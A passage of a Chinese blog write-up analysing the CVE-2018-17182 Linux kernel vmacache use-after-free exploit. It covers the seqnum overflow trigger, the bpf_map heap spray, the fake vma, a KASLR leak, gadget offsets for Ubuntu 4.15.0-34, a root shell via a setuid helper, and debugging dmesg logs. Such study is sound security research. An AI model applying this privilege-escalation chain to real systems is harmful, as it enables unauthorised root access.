area（VMA）都是一段连续的虚拟内存地址，这些内存区域绝不会重合。一个vm_area_struct描述一个内存区域，包括了它的起始地址和结束地址，内存访问权限标志位，以及一个vm_file字段（如果有该字段的话，用来指定哪个文件映射到了该内存区域）。进程内存布局中除了内存映射段外的每一个内存段都对应一个VMA。这种方式尽管在X86机器上很常见，但这并不是硬性要求。VMA们并不关心它们对应的是哪个段。<br> 一个程序的VMA们都是作为一个链表存在于内存描述符的mmap字段中的，并且按照虚拟地址进行了排序，并且是一个以mm_rb为根节点的红黑树。采用红黑树的数据结构是为了方便内核给定虚拟地址后快速查找对应的内存区域。当你读/proc/pid_of_process/maps这个文件时，内核就是简单的遍历进程的VMA链表并挨个打印。</p><h2 id="新的vma缓存机制"><a href="#新的vma缓存机制" class="headerlink" title="新的vma缓存机制"></a><strong>新的vma缓存机制</strong></h2><p> 内核在3.16版本之后对vma的查找进行了优化，在task_struct中加入了一个vmmacache数组和一个32位的vmcache_seqnum值，在mm_struct结构中加入了一个32位的vmacache_seqnum值，并且在此基础上定义了一系列的操作函数。在4.18.8内核源代码中体现在task_struct中的vmacache成员.  </p><ul><li>vmacache</li></ul><p><img src="4.png" alt="4"></p><ul><li>mm_struct</li></ul><p><img src="5.png" alt="5"><br> 基于此基础上定义的操作函数需要了解的有</p><ul><li>vmacache_invalidate  </li></ul><p><img src="6.png" alt="6"><br> 此函数将mm_struct里面的vmacache_seqnum自增一，随后检查是否溢出，如果发现溢出为0，则调用vmacache_flush_all()函数，由前面可知漏洞就出现在这个函数中。  </p><ul><li>vmacache_flush_all  </li></ul><p><img src="7.png" alt="7"><br>在这个函数中，对于单线程的进程会直接返回，如果不是单线程则会对每个进程进行查找，直到找到对应的进程描述符，然后调用vmacache_flush对当前的进程描述符进行缓存清理。</p><ul><li>vmacache_flush  </li></ul><p><img src="8.png" alt="8"><br>此函数对进程描述符中的vmacache成员的vmas成员进行清零。  </p><ul><li>vmacache_valid  </li></ul><p><img src="11.png" alt="11"><br>此函数会检查mm_struct中的vmacache_seqnum和task_struct中的vmacache.seqnum是否相同，如果不相同则使得后者等于前者，随后再调用vmacache_flush清理task_struct的缓存列表。</p><ul><li>vma_find</li></ul><p><img src="10.png" alt="10"><br>此函数根据虚拟地址addr来查找对应的vma结构体。先是调用vmacache_find函数看看在进程描述符中的vmacache中有无符合的，找到直接返回vma结构的地址，如果没有找到即使用红黑树算法去寻找，找到之后使用vmacache_update函数将找到的vma结构加入缓存中。</p><ul><li>vmacache_find</li></ul><p><img src="9.png" alt="9">  </p><p> 此函数作用是在vma的缓存列表中寻找addr命中的vma结构，首先调用vmacache_valid，在其中会检查current-&gt;vmacache_seqnum是否等于current-&gt;mm-&gt;vmacache_seqnum，如果之前有过调用vmacache_invalidate，在这里会直接去调用vmacache_flush函数，刷新task_struct的vmacache链表之后会返回null。</p><h2 id="漏洞触发思路"><a href="#漏洞触发思路" class="headerlink" title="漏洞触发思路"></a>漏洞触发思路</h2><p>在mm_struct的seqnum发生溢出之后，会调用vmacache_flush_all,但是由于是单线程所以不会把task_struct中的缓存列表给清空，里面还会保存之前存有的vma结构的指针，在vmacache_valid函数被触发之前，立即申请一个新的线程，这个时候原线程task_struct里面的seqnum还为0xffffffff，并没有被更新为0，虽然新建立的线程自己有一个单独的task_struct, 但是是共享同一个mm_struct的，这个时候在新创建的线程之中再将mm_struct的seqnum增加为0xffffffff，然后退出这个线程，回到原先的线程中，原先的线程中的vmacache数组里面存在已经释放了的vma的引用，而且task_struct的seqnum和mm_struct的seqnum又相等了，从而绕过vmacache_valid的检查。这样UAF就达到了。<br> 还有一个问题没有解决，我们要在libc的层次使用什么函数才能改变seqnum的值？答案是mmap系统调用和munmap系统调用。</p><ul><li>带MAP_FIXED的mmap函数的代码分析</li></ul><p>首先我们得先对MAP_FIXED标识有一个大概的认识，如果我们使用带有MAP_FIXED标识的mmap函数去映射某一虚拟地址的内存区域分配一个新的vma结构A，则在内核中会检查是否存在和A重合的vma结构B，如果存在则会释放注销B，把其重新分配给A。<br><img src="12.png" alt="12"><br>最终在内核代码中定为到mmap_region这个函数中，在这个函数中会调用do_munmap函数来注销对应的内存区域的vma结构。</p><ul><li>munmap函数的代码分析  </li></ul><p><img src="13.png" alt="13"><br> 在do_munmap函数中会调用detach_vmas_to_be_unmapped函数，detach_vmas_to_be_unmapped函数中会调用vmacache_invalidate来使得mm_struct的seqnum加一,最后在remove_vma_list函数中会调用remove_vma函数来使用kemem_cache_free来释放vma结构。而且在do_munmap一开始就会调用vma_find，而vma_find又会调用vmacache_validate，所以每次调用do_munmap函数会更新vmacache或者清空它。</p><h2 id="Exp分析"><a href="#Exp分析" class="headerlink" title="Exp分析"></a>Exp分析</h2><p>漏洞利用代码: <a href="https://github.com/jas502n/CVE-2018-17182" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2018-17182</a><br>漏洞发现者主要写了4份代码，分别是puppteer.c puppet.c vmacache_helper.c suidhelper.c。 其中vmacache_helper.c是一份帮助我们理解和调试的辅助驱动代码。其实现了一套ioctl系统来辅助漏洞的利用，定义了vmacache_debug_dump()来实现dump当前mm结构的信息，以及ioctl的SEQUENCE_BUMP选项可以快速增加vm_struct的seqnum的值。<br> 在puppet.c中使用CHEAT这个宏来控制是否使用vmacache_helper驱动提供的测试接口。</p><ul><li><p><strong>puppeteer.c代码分析1</strong><br>puppeteer是主进程，所以我们首先分析这个，在puppeteer.c的main函数中定义了<br>control_fd_pair[2], control_event_fd，这两个东西用于puppteer和puppt的进程通信。eventfd函数使用EFD_SEMAPHORE标识创建了一个为读取新文件提供的类似于信号量的语义描述符，在内核中，内核会创建一个对象，对象中维护一个uint64_t的计数器，eventfd的第一个参数即为这个计数器的初始化值，在这里被初始化为0。当计数器为0时且eventfd被EFD_SEMAPHORE标识时，对其使用read系统调用会使得进程被阻塞，知道计数器变为非0值。对其使用write系统调用，计数器会加上buf中的8字节的整数值，这个会导致计数器值的变化，会使得被阻塞的进程恢复运行。在这里control_event_fd的作用是在主进程中实现了将fakevma伪造完之后发送信号即调用sync_add让子进程继续去触发缺页异常，从而控制执行流程。<a href="http://man7.org/linux/man-pages/man2/eventfd.2.html" target="_blank" rel="noopener">eventfd详情参见</a><br>main函数还使用socketpair对control_fd_pair进行初始化，socketpair定义了双向的套接字，子进程puppet可以将注册的bpf_map传回puppeteer，至于bpf_map是什么我们之后再讲。之后又在子进程执行execl(“./puppet”, “puppet”, NULL)之前将control_fd_pair[1]重定向为标准输入，将control_event_fd重定向为标准输出。<a href="http://man7.org/linux/man-pages/man2/socketpair.2.html" target="_blank" rel="noopener">socketpair详情参见</a></p></li><li><p><strong>puppet.c代码分析</strong><br>puppet全篇用的都是直接系统调用，没有通过libc，这是因为libc通常会自己分配一些存储空间，这样的话或许会对我们mmap的操作产生影响。在_start函数中，也定义了一个sync_fd，通过eventfd系统调用创建，这个sync_fd主要是阻塞puppet直到线程执行完毕。<br>_start函数首先通过mmap分配了FAST_WRAP_AREA地址的三个内存页用来作为sequence_target函数累加mm_struct的seqnum。<br><img src="14.png" alt="14"><br>带有MAP_FIXED标识的mmap函数我们前面已经分析过了，如果去申请第一页的映射则会造成munmap第一页，seqnum增一，如果去申请中间页，则会造成munmap第一页和第三页，seqnum增二。sequence_target用于将mm_struct的seqnum增加到指定值。<br><img src="15.png" alt="15"><br>在这里sequence_target将seqnum增加至0x100000000 - VMA_SPAM_COUNT/2之后，离溢出还有VMA_SPAM_COUNT/2个，随后又使用mmap在VMA_SOAM_AREA地址开始分配VMA_SPAM_COUNT个内存页，之后又munmap释放了VMA_SPAM_COUNT/2个内存页使得mm_struct的seqnum发生溢出，之后立马调用自己的thread_create函数来创建一个新的进程，来恢复seqnum的值重新为0xffffffff和task_struct的seqnum为一致。注意在创建线程之前，seqnum发生溢出的时候由于是单线程，所以task_struct的vmcache的vma数组列表中还保存着最后一个被释放的内存页的vma结构的地址，这样就给了我们UAF的条件。在创建线程之后有一个sync_dec(sync_fd)用来对sync_fd进行read操作以至于使得puppet源线程阻塞，等待新的线程执行完毕。<br><img src="16.png" alt="16"><br>我们再来看看新线程的主要实现是在child_main函数中,在这里首先是把之前还剩下的在VMA_SPAM_AREA地址后面的VMA_SPAM_COUNT/2个内存页给munmap掉，这样我们会把整个的vma slab全部变成free，从而将这个slab释放会伙伴系统，至于slab算法，详情参考：<a href="https://blog.csdn.net/lukuen/article/details/6935068" target="_blank" rel="noopener">https://blog.csdn.net/lukuen/article/details/6935068</a>。<br>然后在这里我们见到了bpf_map，bpf其实就是耳熟能详的网络包过滤器，这个功能被集成在Linux内核中作为一个驱动模块，但是在这里并不是为了过滤网络包，而是通过这个bpf_map我们可以在内核中通过slub分配很多内存并且可以任意修改，这样就可以将包含着我们源线程vmacache缓存数组中没有flush的vma结构的一整页全部申请出来，这样就可以通过bpf_map去修改还没有flush的vma结构，之后我们通过出发缺页异常，回源线程中调用我们这个vma结构的异常处理程序，从而最终完成执行流程的劫持。我们使用sendfd(0, bpf_map)讲bpf_map传回puppteer进程中。 在退出新线程之前，我们再通过sequence_target将mm_struct的seqnum恢复至0xffffffff，接着使用sync_add(sync_fd)取消源线程的阻塞。<br><img src="17.png" alt="17"><br>回到源线程，新线程执行完毕后，通过对sync_fd进行写操作，在内核中会对0x7fffffffd000内存页进行copy_from_user操作，这里为了避免这个页已经被映射到，故意使用比较高的地址，这样copy_from_user就会失败，触发PAGE_FAULT。<br><img src="18.png" alt="18"><br>__do_page_fault中会获取地址所对应的vma，所以会调用find_vma函数，find_vma中又会调用vmacache_find函数。<br><img src="19.png" alt="19"><br>在这里，由于bpf会将分配的内存清空，这个特性正好帮助我们触发warn_on_once,以此将信息dump到dmesg中泄露内核空间地址，从而绕过kaslr。在触发WARN_ON_ONCE之后会继续执行，因此这里的vma仅仅返回null，并且回到红黑树查找，最后也没有找到返回NULL，这个时候缺页中断流程会给用户进程发送SIGSEGV，并不会将系统崩溃(此处有点疑问，为什么puppet进程收到SIGSEGV信号却不会被杀掉)。随后puppet进程通过sync_dec(1)来使自身阻塞，在puppeteer进程将vma准备好之后，并且通过bpf_map写入之后，才得以继续执行对event_fd的读操作也就是对0x7fffffffd000的引用导致PAGE_FAULT，以此来劫持程序执行流程。</p></li><li><p><strong>puppeteer.c代码分析2</strong><br><img src="20.png" alt="20"><br><img src="21.png" alt="21"><br>在puppeteer中，当puppet进程成功触发warn_on_once以及得到bpf_map之后，便会通过以上代码找到相关的地址信息。rax是UAF的vma结构的地址，rdi是mm_struct的地址， r8是eventfd_fops的地址，还有内核栈的地址。<br><img src="22.png" alt="22"><br>一开始通过已经得知的vma_kaddr来求此结构在内存页中的偏移offset，但是由于bpf_update的时候会自动加上bpf_map_header的偏移，所以在这里减去了0x90。<br>在伪造vma结构的时候，将vm_start和vm_end改为一段没有被映射的区域，在这里仍然是0x7fffffffd000~0x7fffffffe000。这样当我们引用这块内存时会触发PAGE_FAULT，当调用vmacache_find函数时就会从指针列表中找到我们伪造的vma结构，然后find_vma就会返回伪造的vma结构的指针给<strong>do_page_fault函数，在</strong>do_page_fault函数中又调用handle_mm_fault函数，执行流程如下：<br>page_fault =&gt; do_page_fault =&gt; <strong>do_page_fault =&gt; handle_mm_fault =&gt; __handle_mm_fault =&gt; handle_pte_fault =&gt; do_fault =&gt; do_read_fault =&gt; __do_fault =&gt; vma-&gt;vm_ops-&gt;fault()。<br><img src="23.png" alt="23"><br>这样就会去执行伪造的vma结构中我们布置的vm_ops中的fault函数。vm_ops的值为vma_kaddr + offsetof(struct vm_area_struct, vm_private_data) - offsetof(struct vm_operations_struct, fault)，这样在调用vma-&gt;vm_ops-&gt;fault的时候，就是vma_kaddr + offsetof(struct vm_area_struct, vm_private_data)即vm_private_data，所以在这里vm_private_data被赋值为eventfd_fops-0xd8da5f。<br>此处的gadget的汇编为<br><img src="24.png" alt="24"><br>call __x86_indirect_thunk_rax即为call rax，所以我们要控制rax，调试中发现r13就为vma_kaddr，所以在vma_kaddr+0x70的地方即.share.rb_subtree_last成员赋值为vma_kaddr + offsetof(struct vm_area_struct, shared.rb.</strong>rb_parent_color) - 0x88，这样最后rax的值为shared.rb.<strong>rb_parent_color的值，所以在shared.rb.</strong>rb_parent_color赋值为eventfd_fops-0xd9ebd6，跳转至下一个gadget的汇编代码如下。<br><img src="25.png" alt="25"><br>调试发现rdi为vma_kaddr，所以rax就为vma_kaddr+0x20,rdi位vma_kaddr+0x28，所以在fake_vma中赋值为vm_rb.__rb_parent_color=eventfd-0xd92ce0即run_cmd gadget的地址，vm_rb.rb_left为kernel_cmd的地址，这样rax为run_cmd的地址，rdi即第一个参数为kernel_cmd的地址，kernel_cmd为一串字符串/tmp/%1，run_cmd会根据这个路径作为参数以root的权限来执行里面的命令，在这之前/tmp/%1已经被写入要被执行的命令。<br><img src="26.png" alt="26"><br>大概的意思是位suidhelper程序设置s位，使其能够成功执行setuid(0)和setgid(0)，并弹出一个具有root权限的shell。<br>至此大概的exp思路分析完毕。</p></li></ul><h1 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h1><p>这里我踩了非常多的大坑，我一开始搭建的linux环境是直接拿linux-4.18.8的源码编译的，结果exp执行失败，fake vma push之后，仍然没有检测到suidhelper被设置s位，于是我就得去具体调试分析，一开始我用qemu调试的，发现了不少问题，首先是qemu中seqnum的初始值是0，不是2（使用exp编写者提供的vmacache_helper驱动在dump中发现）。解决了这个问题之后，又发现网络好像不可用，为了解决qemu的网络问题，又踩了很多坑，比如说如果要使用e1000这个网卡的话，编译bzImage的时候，config中就要添加对这个网卡的驱动支持（我太菜了，没想到）。最后好不容易网络问题解决之后，结果将bpf发送给puppeteer进程的sendmsg函数还是失败了，发现qemu的水太深了，于是转而寻找另外的方法，使用两个虚拟机一个host一个target搭建双机调试环境。<br>具体参考sakura师傅的<a href="https://www.anquanke.com/post/id/105342" target="_blank" rel="noopener">https://www.anquanke.com/post/id/105342</a>。<br>到此，我们已经可以对exp触发的rop进行调试了，这时又有一个大坑来了，exp中的偏移不是linux-4.18.8的，在linux-4.18.8版本的内核下调试，发现泄露出来的r8也就是event_fops是在内核堆上的，绕不了kaslr，不过应该还存在其他利用的方法比如ret2dir之类的（待试）。还有一个地方就是fake_vma相对于fake_page的偏移应该还要减去0x40。<br>最后我在漏洞发现者的文章中看到exp的偏移是对于Ubuntu 4.15.0-34-generic而言的。最终再次进行调试发现成功在run_cmd触发到了断点。<br><img src="27.png" alt="27"><br>下面是dmesg<br>[  150.815248] helper: loading out-of-tree module taints kernel.<br>[  150.815275] helper: module verification failed: signature and/or   required key missing - tainting kernel<br>[  150.816673] loading helper module<br>[  245.547845] entering vmacache_debug_dump(0xffff8bc0454a39c0)<br>[  245.547846] mm sequence: 0x2<br>[  245.547901] task 0xffff8bbf76745d00 at 0x2 (current)<br>[  245.547901]     cache dump:<br>[  245.547901]       0xffff8bbfe3a6c5b0<br>[  245.547903]         start=0x410000000000 end=0x410000010000     mm=0xffff8bc0454a39c0<br>[  245.547903]       0xffff8bbfe3a70dd0<br>[  245.547904]         start=0x7fff8b3fd000 end=0x7fff8b3ff000   mm=0xffff8bc0454a39c0<br>[  245.547904]       0xffff8bbfe3a70680<br>[  245.547904]         start=0x55e7c204e000 end=0x55e7c204f000 mm=0xffff8bc0454a39c0<br>[  245.547905]       0x0<br>[  245.547909]   #####<br>[  245.583131] entering vmacache_debug_dump(0xffff8bc0454a39c0)<br>[  245.583132]   mm sequence: 0x0<br>[  245.583228]   task 0xffff8bbf76745d00 at 0xffffffff (current)<br>[  245.583228]     cache dump:<br>[  245.583228]       0x0<br>[  245.583234]       0x0<br>[  245.583237]       0xffff8bbfe3b0a410<br>[  245.583238]         start=0xd4ec2418a27c7a3 end=0x42000270f000   mm=0xffff8bc0454a39c0<br>[  245.583238]       0xffff8bbfe3b0b5f0<br>[  245.583239]         start=0x420002710000 end=0x420002711000   mm=0xffff8bc0454a39c0<br>[  245.583239]   #####<br>[  245.583261] entering vmacache_debug_dump(0xffff8bc0454a39c0)<br>[  245.583261]   mm sequence: 0x0<br>[  245.583284]   task 0xffff8bbf76745d00 at 0xffffffff<br>[  245.583284]     cache dump:<br>[  245.583285]       0x0<br>[  245.583288]       0x0<br>[  245.583291]       0xffff8bbfe3b0a410<br>[  245.583292]         start=0xd4ec2418a27c7a3 end=0x42000270f000 mm=0xffff8bc0454a39c0<br>[  245.583292]       0xffff8bbfe3b0b5f0<br>[  245.583292]         start=0x420002710000 end=0x420002711000   mm=0xffff8bc0454a39c0<br>[  245.583293]   task 0xffff8bbf756845c0 at 0xffffffff (current)<br>[  245.583293]     cache dump:<br>[  245.583293]       0x0<br>[  245.583296]       0x0<br>[  245.583299]       0x0<br>[  245.583302]       0x0<br>[  245.583305]   #####<br>[  245.586224] entering vmacache_debug_dump(0xffff8bc0454a39c0)<br>[  245.586224]   mm sequence: 0x1388<br>[  245.586268]   task 0xffff8bbf76745d00 at 0xffffffff<br>[  245.586268]     cache dump:<br>[  245.586268]       0x0<br>[  245.586272]       0x0<br>[  245.586275]       0xffff8bbfe3b0a410<br>[  245.586276]         start=0x0 end=0x0 mm=0x0<br>[  245.586276]       0xffff8bbfe3b0b5f0<br>[  245.586277]         start=0x0 end=0x0 mm=0x0<br>[  245.586277]   task 0xffff8bbf756845c0 at 0x1387 (current)<br>[  245.586277]     cache dump:<br>[  245.586278]       0x0<br>[  245.586280]       0x0<br>[  245.586283]       0xffff8bbfe3b6af70<br>[  245.586284]         start=0xd4ec2418a27cbe3 end=0x420004e1f000 mm=0xffff8bc0454a39c0<br>[  245.586285]       0xffff8bbfe3a70750<br>[  245.586285]         start=0x55e7c1e4e000 end=0x55e7c1e4f000 mm=0xffff8bc0454a39c0<br>[  245.586285]   #####<br>[  245.613230] entering vmacache_debug_dump(0xffff8bc0454a39c0)<br>[  245.613231]   mm sequence: 0xffffffff<br>[  245.613280]   task 0xffff8bbf76745d00 at 0xffffffff (current)<br>[  245.613281]     cache dump:<br>[  245.613281]       0x0<br>[  245.613286]       0x0<br>[  245.613289]       0xffff8bbfe3b0a410<br>[  245.613290]         start=0x0 end=0x0 mm=0x0<br>[  245.613290]       0xffff8bbfe3b0b5f0<br>[  245.613291]         start=0x0 end=0x0 mm=0x0<br>[  245.613291]   task 0xffff8bbf756845c0 at 0xfffffffe<br>[  245.613291]     cache dump:<br>[  245.613292]       0xffff8bbfe3a6da00<br>[  245.613292]         start=0x400000000000 end=0x400000003000 mm=0xffff8bc0454a39c0<br>[  245.613293]       0x0<br>[  245.613295]       0x0<br>[  245.613298]       0x0<br>[  245.613301]   #####<br>[  245.613310] WARNING: CPU: 0 PID: 2036 at /build/linux-SlLHxe/linux-4.15.0/mm/vmacache.c:102 vmacache_find+0x9c/0xb0<br>[  245.613311] Modules linked in: helper(OE) vmw_vsock_vmci_transport vsock crct10dif_pclmul crc32_pclmul ghash_clmulni_intel pcbc aesni_intel aes_x86_64 crypto_simd glue_helper vmw_balloon cryptd joydev input_leds serio_raw vmw_vmci sch_fq_codel parport_pc ppdev lp parport ip_tables x_tables autofs4 hid_generic psmouse usbhid hid ahci libahci mptspi e1000 scsi_transport_spi mptscsih mptbase floppy<br>[  245.613330] CPU: 0 PID: 2036 Comm: puppet Tainted: G           OE    4.15.0-34-generic #37-Ubuntu<br>[  245.613330] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 07/29/2019<br>[  245.613332] RIP: 0010:vmacache_find+0x9c/0xb0<br>[  245.613333] RSP: 0018:ffffaf2882673c78 EFLAGS: 00010203<br>[  245.613334] RAX: ffff8bbfe3b0a410 RBX: 00007fffffffd000 RCX: 0000000000000002<br>[  245.613334] RDX: 0000000000000002 RSI: 00007fffffffd000 RDI: ffff8bc0454a39c0<br>[  245.613335] RBP: ffffaf2882673c78 R08: 0000000000000000 R09: 0000000000000000<br>[  245.613335] R10: 0000000000000000 R11: 0000000000000000 R12: ffff8bc0454a39c0<br>[  245.613336] R13: ffffaf2882673d58 R14: ffff8bc0454a39c0 R15: 0000000000000014<br>[  245.613337] FS:  00007f1ac9a4aa80(0000) GS:ffff8bc079600000(0000) knlGS:0000000000000000<br>[  245.613337] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033<br>[  245.613338] CR2: 00007fffffffd000 CR3: 00000000a3bc6002 CR4: 00000000003606f0<br>[  245.613356] Call Trace:<br>[  245.613366]  find_vma+0x1b/0x70<br>[  245.613368]  __do_page_fault+0x174/0x4d0<br>[  245.613370]  do_page_fault+0x2e/0xe0<br>[  245.613372]  page_fault+0x25/0x50<br>[  245.613374] RIP: 0010:copy_user_generic_unrolled+0x86/0xc0<br>[  245.613374] RSP: 0018:ffffaf2882673e08 EFLAGS: 00050202<br>[  245.613375] RAX: 00007fffffffd008 RBX: 0000000000000008 RCX: 0000000000000001<br>[  245.613375] RDX: 0000000000000000 RSI: 00007fffffffd000 RDI: ffffaf2882673e30<br>[  245.613376] RBP: ffffaf2882673e20 R08: ffffffffb7c43680 R09: 0000000000000002<br>[  245.613376] R10: ffff8bbfe2289f38 R11: 0000000000000000 R12: ffffaf2882673e30<br>[  245.613377] R13: ffff8bbfe2289f00 R14: ffff8bbf76745d00 R15: ffff8bbfe2289f00<br>[  245.613386]  ? _copy_from_user+0x3e/0x60<br>[  245.613388]  eventfd_write+0x74/0x270<br>[  245.613390]  ? common_file_perm+0x58/0x160<br>[  245.613392]  ? wake_up_q+0x80/0x80<br>[  245.613393]  __vfs_write+0x1b/0x40<br>[  245.613394]  vfs_write+0xb1/0x1a0<br>[  245.613395]  SyS_write+0x55/0xc0<br>[  245.613396]  ? SyS_ioctl+0x63/0x90<br>[  245.613398]  do_syscall_64+0x73/0x130<br>[  245.613399]  entry_SYSCALL_64_after_hwframe+0x3d/0xa2<br>[  245.613401] RIP: 0033:0x55e7c1e4e75c<br>[  245.613401] RSP: 002b:00007fff8b3f8430 EFLAGS: 00000206 ORIG_RAX: 0000000000000001<br>[  245.613402] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 000055e7c1e4e75c<br>[  245.613403] RDX: 0000000000000008 RSI: 00007fffffffd000 RDI: 0000000000000005<br>[  245.613403] RBP: 0000000000000001 R08: 0000000000000000 R09: 0000000000000000<br>[  245.613404] R10: 0000000000000000 R11: 0000000000000206 R12: 0000000000000008<br>[  245.613404] R13: 0000420004e20000 R14: 00007fffffffd000 R15: 00007fff8b3f8438<br>[  245.613405] Code: 00 48 8b 84 c8 10 08 00 00 48 85 c0 74 11 48 39 78 40 75 17 48 39 30 77 06 48 39 70 08 77 8d 83 c2 01 83 fa 04 75 ce 31 c0 5d c3 &lt;0f&gt; 0b 31 c0 5d c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 0f<br>[  245.613423] —[ end trace 8c418163f19a50b6 ]—<br>[  251.641288] entering vmacache_debug_dump(0xffff8bc0454a39c0)<br>[  251.641289]   mm sequence: 0xffffffff<br>[  251.641365]   task 0xffff8bbf76745d00 at 0xffffffff (current)<br>[  251.641365]     cache dump:<br>[  251.641365]       0x0<br>[  251.641371]       0x0<br>[  251.641374]       0xffff8bbfe3b0a410<br>[  251.641375]         start=0x7fffffffd000 end=0x7fffffffe000   mm=0xffff8bc0454a39c0<br>[  251.641375]       0xffff8bbfe3b0b5f0<br>[  251.641376]         start=0xff000564ff000560 end=0xff00056cff000568 mm=0xff0005a4ff0005a0<br>[  251.641389]   #####<br>[  251.641689] kernel tried to execute NX-protected page - exploit attempt? (uid: 0)<br>[  251.641692] BUG: unable to handle kernel paging request at ffffaf2882673c40<br>[  251.641695] IP: 0xffffaf2882673c40<br>[  251.641696] PGD 139142067 P4D 139142067 PUD 139143067 PMD ab696067 PTE 80000000a3b8b063<br>[  251.641699] Oops: 0011 [#1] SMP PTI<br>[  251.641701] Modules linked in: helper(OE) vmw_vsock_vmci_transport vsock crct10dif_pclmul crc32_pclmul ghash_clmulni_intel pcbc aesni_intel aes_x86_64 crypto_simd glue_helper vmw_balloon cryptd joydev input_leds serio_raw vmw_vmci sch_fq_codel parport_pc ppdev lp parport ip_tables x_tables autofs4 hid_generic psmouse usbhid hid ahci libahci mptspi e1000 scsi_transport_spi mptscsih mptbase floppy<br>[  251.641720] CPU: 0 PID: 2036 Comm: puppet Tainted: G        W  OE    4.15.0-34-generic #37-Ubuntu<br>[  251.641721] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 07/29/2019<br>[  251.641722] RIP: 0010:0xffffaf2882673c40<br>[  251.641723] RSP: 0018:ffffaf2882673bc8 EFLAGS: 00010202<br>[  251.641724] RAX: 0000000000000000 RBX: ffffffffb6eb5c39 RCX: 000000000000acc0<br>[  251.641725] RDX: 000000000000acbf RSI: ffff8bc079627080 RDI: ffff8bc079007900<br>[  251.641726] RBP: ffffffffb700aad4 R08: 0000000000027080 R09: ffffffffb777691a<br>[  251.641727] R10: ffffcf7f4288a640 R11: 00000000000003dd R12: ffffaf2882673c40<br>[  251.641728] R13: ffff8bbfe3b0a410 R14: 0000000000000001 R15: ffff8bc0454a39c0<br>[  251.641729] FS:  00007f1ac9a4aa80(0000) GS:ffff8bc079600000(0000) knlGS:0000000000000000<br>[  251.641730] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033<br>[  251.641731] CR2: ffffaf2882673c40 CR3: 00000000a3bc6006 CR4: 00000000003606f0<br>[  251.641748] Call Trace:<br>[  251.641753]  ? handle_pte_fault+0x217/0xd30<br>[  251.641754]  ? __handle_mm_fault+0x478/0x5c0<br>[  251.641756]  ? handle_mm_fault+0xb1/0x1f0<br>[  251.641759]  ? __do_page_fault+0x250/0x4d0<br>[  251.641761]  ? do_page_fault+0x2e/0xe0<br>[  251.641763]  ? page_fault+0x25/0x50<br>[  251.641766]  ? __put_user_8+0x1c/0x25<br>[  251.641768]  ? eventfd_read+0x55/0x90<br>[  251.641770]  ? __vfs_read+0x1b/0x40<br>[  251.641771]  ? vfs_read+0x8e/0x130<br>[  251.641772]  ? SyS_read+0x55/0xc0<br>[  251.641774]  ? SyS_ioctl+0x79/0x90<br>[  251.641776]  ? do_syscall_64+0x73/0x130<br>[  251.641778]  ? entry_SYSCALL_64_after_hwframe+0x3d/0xa2<br>[  251.641779] Code: af ff ff f8 0f 00 40 bf 8b ff ff 01 00 00 00 00 00 00 00 c0 39 4a 45 c0 8b ff ff d8 3c 67 82 28 af ff ff 08 08 01 b7 ff ff ff ff &lt;10&gt; a4 b0 e3 bf 8b ff ff 15 00 00 00 c0 00 40 01 00 00 00 00 00<br>[  251.641798] RIP: 0xffffaf2882673c40 RSP: ffffaf2882673bc8<br>[  251.641799] CR2: ffffaf2882673c40<br>[  251.641800] —[ end trace 8c418163f19a50b7 ]—<br>[  251.645745] BUG: non-zero pgtables_bytes on freeing mm: 4096  </p><p>不过还是存在几个问题：</p><ol><li><p>为啥event_fops的地址在4.18.8和4.15.0中会不一样，一个在text上一个在堆上面？</p></li><li><p>qemu的网络问题仍然不知道是什么原因？</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> linux kernel uaf </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
